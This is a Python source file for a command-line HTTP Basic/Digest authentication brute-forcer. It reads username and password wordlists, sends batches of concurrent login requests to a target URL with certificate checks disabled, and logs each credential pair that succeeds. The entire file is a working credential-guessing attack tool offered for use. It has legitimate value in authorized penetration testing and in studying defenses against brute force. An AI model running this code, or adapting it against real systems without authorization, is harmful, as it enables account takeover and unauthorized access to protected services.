import re
import sys
import base64
import argparse
import requests
import grequests
import validators
import itertools
import datetime
import time

from lib import logger


# Disable InsecureRequestWarning for unverified HTTPS request
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

log = logger.logger()


def print_banner():

    banner = '-------------------------\n' \
             '~ HTTP Auth Bruteforcer ~\n' \
             '-------------------------\n'

    log.info(banner)


def parse_args():
    def check_arg_url(value):
        try:
            validators.url(value)
        except:
            raise Exception('URL is not valid')
        return value

    def check_arg_auth_type(value):
        if value not in ['basic', 'digest']:
            raise Exception('Authentication type not valid')
        return value

    def check_arg_buffer_size(value):
        try:
            value = int(value)
        except:
            raise Exception('Buffer size is not a integer')
        if value < 1 or value > 10:
            raise Exception('Buffer size should be 1 < buffer size < 10')
        return value

    parser = argparse.ArgumentParser(description='HTTP Auth Bruteforcer')
    parser.add_argument('url', metavar='url', type=check_arg_url, help='URL protected by authentication')
    parser.add_argument('-a', '--authtype', type=check_arg_auth_type, required=True, help='Auth Type: Basic or Digest (b/d)')
    parser.add_argument('-b', '--buffersize', type=check_arg_buffer_size, default=5, help='Buffer size (1 < buffer size < 10)')
    userpass_group = parser.add_mutually_exclusive_group()
    userpass_group.add_argument('-c', '--credentialsfile', type=argparse.FileType('r'), help='File containing the usernames and passwords (one "username:password" per line)')
    userpass_files_group = userpass_group.add_argument_group()
    userpass_files_group.add_argument('-u', '--usernamesfile', type=argparse.FileType('r'), help='File containing the usernames (one "username" per line)')
    userpass_files_group.add_argument('-p', '--passwordsfile', type=argparse.FileType('r'), help='File containing the passwords (one "password" per line)')
    args = parser.parse_args()

    return args


def print_server_informations(url):
    try:
        resp = requests.get(url, verify=False, timeout=5)
        log.info('URL: ' + url)
        log.info('Response status code: ' + str(resp.status_code))
        log.info('Server: ' + resp.headers['Server'])
        log.info('Date: ' + resp.headers['Date'])
        try:
            log.info('Authentication type: ' + resp.headers['WWW-Authenticate'].split(' ')[0])
        except:
            pass
        try:
            realm = re.search(r'realm="(.*?)"', resp.headers['WWW-Authenticate']).group(1)
            log.info('Authentication information: realm:' + str(realm))
        except:
            pass
        try:
            algorithm = re.search(r'algorithm=(.*?),', resp.headers['WWW-Authenticate']).group(1)
            log.info('Authentication information: algorithm:' + str(algorithm))
        except:
            pass
        try:
            domain = re.search(r'domain="(.*?)"', resp.headers['WWW-Authenticate']).group(1)
            if len(domain.split(' ')) != 1:
                for domain in domain.split(' '):
                    log.info('Authentication information: domain:' + str(domain))
            else:
                log.info('Authentication information: domain:' + str(domain))
        except:
            pass

    except:
        log.info('Error while requesting URL + "' + url + '"')


def check_url_requires_auth(url):
    try:
        resp = requests.get(url, verify=False, timeout=5)
        if resp.status_code != 401:
            return False
        else:
            return True
    except:
        log.info('Error while requesting URL + "' + url + '"')
        return False

    return False


class Credentials:
    def __init__(self, username, password):
        self.username = username
        self.password = password


class HTTPAuthUtils:
    @staticmethod
    def get_credentials_from_basic_requests(resp):
        resp_req_header = vars(vars(resp)['request'])['headers']
        resp_req_www_auth = resp_req_header['Authorization']
        resp_req_www_basic  = resp_req_www_auth.split(' ')[1]
        resp_req_www_basic_decoded = base64.standard_b64decode(resp_req_www_basic).decode('utf-8')

        username = resp_req_www_basic_decoded.split(':')[0]
        password = resp_req_www_basic_decoded.split(':')[1]

        credentials = Credentials(username, password)

        return credentials

    @staticmethod
    def get_credentials_from_digest_requests(resp, reqs):
        credentials = None

        resp_req_header = vars(vars(resp)['request'])['headers']
        resp_req_www_auth = resp_req_header['Authorization']
        resp_req_nonce = re.search(r'nonce="(.*?)"', resp_req_www_auth).group(1)

        for req in reqs:
            req_header = vars(vars(vars(req)['response'])['request'])['headers']
            req_www_auth = req_header['Authorization']
            req_nonce = re.search(r'nonce="(.*?)"', req_www_auth).group(1)

            if resp_req_nonce == req_nonce:
                req_username = vars(vars(req)['kwargs']['auth'])['username']
                req_password = vars(vars(req)['kwargs']['auth'])['password']

                credentials = Credentials(req_username, req_password)

        return credentials


def credentials_generator_from_credentials_file(credentials_file_object, buffer_size):
    credentials_buffer = []

    for line in credentials_file_object:
        username = line.strip().split(':')[0]
        password = line.strip().split(':')[1]

        credentials = Credentials(username, password)

        credentials_buffer.append(credentials)

        if len(credentials_buffer) >= buffer_size:
            yield credentials_buffer

            credentials_buffer = []

    if len(credentials_buffer) != 0:
        yield credentials_buffer


def credentials_generator_from_username_and_password_files(username_file_object, password_file_object, buffer_size):
    credentials_buffer = []

    for uline in username_file_object:
        username = uline.strip()

        password_file_object, password_file_object_this_loop = itertools.tee(password_file_object)

        for pline in password_file_object_this_loop:
            password = pline.strip()

            credentials = Credentials(username, password)

            credentials_buffer.append(credentials)

            if len(credentials_buffer) >= buffer_size:
                yield credentials_buffer

                credentials_buffer = []

    if len(credentials_buffer) != 0:
        yield credentials_buffer


def test_basic_auth(url, credentials_buffer):
    auth_successes = []

    timeout = 5
    verify = False

    requests_buffer = []

    for credentials in credentials_buffer:
        auth = requests.auth.HTTPBasicAuth(credentials.username, credentials.password)
        requests_buffer.append(grequests.get(url=url, auth=auth, verify=verify, timeout=timeout))

    resps = grequests.map(requests_buffer)

    for resp in resps:
        if resp.status_code == 200:
            credentials = HTTPAuthUtils.get_credentials_from_basic_requests(resp)

            auth_successes.append(credentials)

    return auth_successes


def test_digest_auth(url, credentials_buffer):
    auth_successes = []

    timeout = 5
    verify = False

    requests_buffer = []

    for credentials in credentials_buffer:
        auth = requests.auth.HTTPDigestAuth(credentials.username, credentials.password)
        requests_buffer.append(grequests.get(url=url, auth=auth, verify=verify, timeout=timeout))

    resps = grequests.map(requests_buffer)

    for resp in resps:
        if resp.status_code == 200:
            credentials = HTTPAuthUtils.get_credentials_from_digest_requests(resp, requests_buffer)

            auth_successes.append(credentials)

    return auth_successes


def main():
    args = parse_args()

    print_banner()
    print_server_informations(args.url)

    url_requires_auth = check_url_requires_auth(args.url)

    if not url_requires_auth:
        sys.exit(0)

    creds_generator = None
    if args.credentialsfile:
        creds_generator = credentials_generator_from_credentials_file(args.credentialsfile, args.buffersize)
    else:
        creds_generator = credentials_generator_from_username_and_password_files(args.usernamesfile, args.passwordsfile, args.buffersize)

    log.info('')
    log.info('Authentication tests begin...')
    log.info('Date: ' + datetime.datetime.now().strftime('%H:%M:%S %d/%m/%Y'))
    log.info('')

    count = 0
    for credentials_buffer in creds_generator:
        auth_successes = []

        if args.authtype == 'basic':
            auth_successes = test_basic_auth(args.url, credentials_buffer)
        elif args.authtype == 'digest':
            auth_successes = test_digest_auth(args.url, credentials_buffer)
        else:
            raise Exception('Auth type ' + args.authtype + ' not known')

        if len(auth_successes) != 0:
            for credentials in auth_successes:
                log.success('Authentication success. Username: ' + credentials.username + ', password: ' + credentials.password)

        count += len(credentials_buffer)
        log.info('Authentication attempts: ' + str(count))

        time.sleep(0.5)

    log.info('')
    log.info('Authentication tests finished.')
    log.info('Date: ' + datetime.datetime.now().strftime('%H:%M:%S %d/%m/%Y'))

if __name__ == '__main__':
    main()